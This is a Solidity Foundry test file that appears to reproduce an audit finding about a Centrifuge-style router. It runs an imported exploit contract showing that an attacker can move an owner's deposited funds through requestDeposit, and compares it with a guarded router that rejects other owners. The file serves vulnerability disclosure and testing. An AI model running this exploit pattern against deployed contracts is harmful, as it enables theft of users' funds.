// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {Exploit, Terms, Asset, Vault} from "./35789-centrifuge-router-can-perform-untrusted-actions-on-behalf-of.sol";

interface IVaultMini {
    function setEndorsedOperator(address owner, bool approved) external;
    function requestDeposit(uint256 amount, address controller, address owner) external;
}

/// Same router, but requestDeposit requires the caller to be the owner.
contract GuardedRouter {
    address private _caller;
    error InvalidOwner();

    modifier protected() {
        _caller = msg.sender;
        _;
        _caller = address(0);
    }

    function open(address vault) public protected {
        IVaultMini(vault).setEndorsedOperator(_caller, true);
    }

    function requestDeposit(address vault, uint256 amount, address controller, address owner, uint256) external protected {
        if (owner != _caller && owner != address(this)) revert InvalidOwner();
        IVaultMini(vault).requestDeposit(amount, controller, owner);
    }
}

contract Finding35789Test is Test {
    address constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address constant EXPLOIT = 0x15452EC016c4dc8c549E7fe6Ff4b26324Ea8b7A4;
    address constant TOKEN = 0x8ea53755A6CB335DD77e8DfBE91078CF210015C7;
    address constant VAULT = 0x671D353A77015fA0B747f24eb2a50b0E3340BD1d;
    address constant ROUTER = 0xce01759B82FD6cbf9DA468ae79fdcACc4605a5c5;
    address constant OWNER = 0xbd4Fd5A3ceb32dA8dB79559A1C535578c0F8E57D;

    function test_anyone_moves_owner_funds() public {
        vm.setNonce(ATTACKER, 1);
        vm.prank(ATTACKER);
        Exploit e = new Exploit();
        assertEq(address(e), EXPLOIT, "exploit");
        assertEq(address(e.asset()), TOKEN, "token");
        assertEq(address(e.vault()), VAULT, "vault");
        assertEq(address(e.router()), ROUTER, "router");
        assertEq(address(e.owner()), OWNER, "owner");
        e.run();

        emit log_named_uint("moved", e.moved());
        emit log_named_address("controller", e.controller());

        assertEq(e.moved(), Terms.AMOUNT, "moved");
        assertEq(e.asset().balanceOf(address(e)), Terms.AMOUNT, "attacker");
        assertEq(e.asset().balanceOf(address(e.owner())), 0, "owner");
        assertEq(e.controller(), address(e), "controller");
    }

    function test_control_rejects_other_owner() public {
        Asset asset = new Asset();
        Vault vault = new Vault(asset);
        GuardedRouter router = new GuardedRouter();
        vault.setRouter(address(router));
        Holder owner = new Holder(router);
        asset.mintAndApprove(address(owner), address(vault), Terms.AMOUNT);
        owner.open(address(vault));

        vm.expectRevert(GuardedRouter.InvalidOwner.selector);
        router.requestDeposit(address(vault), Terms.AMOUNT, address(this), address(owner), 0);

        assertEq(asset.balanceOf(address(owner)), Terms.AMOUNT, "owner kept funds");
        assertEq(vault.escrowed(), 0, "nothing moved");
        assertEq(asset.balanceOf(address(this)), 0, "attacker");
    }
}

contract Holder {
    GuardedRouter public router;

    constructor(GuardedRouter _router) {
        router = _router;
    }

    function open(address vault) external {
        router.open(vault);
    }
}
